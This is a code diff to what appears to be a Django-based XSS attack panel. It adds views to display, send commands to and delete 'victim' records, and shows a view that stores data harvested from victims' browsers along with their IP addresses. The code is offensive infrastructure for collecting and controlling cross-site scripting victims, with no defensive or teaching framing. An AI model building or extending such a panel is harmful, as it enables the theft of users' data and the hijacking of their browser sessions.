@@ -26,6 +26,43 @@ def index(request):
             'xssdata': xssdata,
     }, context_instance=RequestContext(request))
 
+def show_victim(request,vid):
+    try:
+        victim = XssData.objects.get(id=vid)
+    except:
+        victim = None
+        
+    return render_to_response('widgets/xss/modal_view_detail.html', {
+            'victim': victim,
+    }, context_instance=RequestContext(request))        
+
+def command_victim(request,vid):
+    try:
+        victim = XssData.objects.get(id=vid)
+    except:
+        victim = None
+        
+    return render_to_response('widgets/xss/modal_command.html', {
+            'victim': victim,
+    }, context_instance=RequestContext(request)) 
+
+def remove_victim(request,vid):
+
+    try:
+        victim = XssData.objects.get(id=vid)
+    except:
+        victim = None
+        
+    action = request.GET.get('action',None)
+    if victim and action == 'remove':
+        victim.delete()
+        ret = {'code':200,'message':'success'}
+        return HttpResponse(json.dumps(ret), mimetype="application/json")
+        
+    return render_to_response('widgets/xss/modal_remove.html', {
+            'victim': victim,
+    }, context_instance=RequestContext(request))
+
 def store_xss_info(request,uid):
     data = request.GET.get('i','')
     ip = request.META['HTTP_X_FORWARDED_FOR'] if 'HTTP_X_FORWARDED_FOR' in request.META else request.META['REMOTE_ADDR']
